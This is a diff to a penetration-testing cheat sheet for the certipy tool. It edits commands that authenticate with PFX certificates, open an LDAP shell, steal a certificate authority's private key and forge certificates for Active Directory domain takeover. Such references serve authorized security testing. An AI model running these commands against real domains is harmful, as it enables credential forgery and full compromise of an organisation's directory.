@@ -17,25 +17,25 @@ certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <temp
 ## certipy - authenticate with pfx certificate
 #plateform/linux #target/remote #cat/CONNECT
 ```
-certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -username <targeted-user> -domain <targeted-user-domain>
+certipy auth -pfx <pfx-file> 
 ```
 
 ## certipy - authenticate through LDAP (Schannel) with pfx certificate
 #plateform/linux #target/remote #cat/CONNECT
 ```
-certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -username <targeted-user> -domain <targeted-user-domain> -ldap-shell
+certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
 ```
 
 ## certipy - Golden Certificate - steal CA certificate and private key
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority>
+certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority> -target-ip <ca-ip>
 ```
 
 ## certipy - Golden Certificate - forge certificate
 #plateform/linux #target/remote #cat/ATTACK
 ```
-certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -subject 'CN=Administrator,CN=Users,DC=<domain>,DC=<domain>'
+certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
 ```
 
 ## certipy - request certificate for another user - ESC1 - ESC6
